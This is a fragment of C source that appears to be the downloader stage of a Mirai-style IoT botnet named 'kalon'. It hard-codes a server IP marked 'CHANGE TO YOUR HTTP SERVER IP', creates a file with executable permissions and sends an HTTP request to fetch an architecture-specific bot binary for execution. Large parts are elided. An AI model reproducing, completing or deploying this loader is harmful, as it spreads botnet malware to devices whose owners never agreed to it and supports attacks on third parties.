...
#define HTTP_SERVER utils_inet_addr(13,250,50,104) // CHANGE TO YOUR HTTP SERVER IP

#define EXEC_MSG            "KALON\n"
...
inline void run(void)
{
    ...
    ffd = open("jnsd9sdoila", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/kalon." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
    {
#ifdef DEBUG
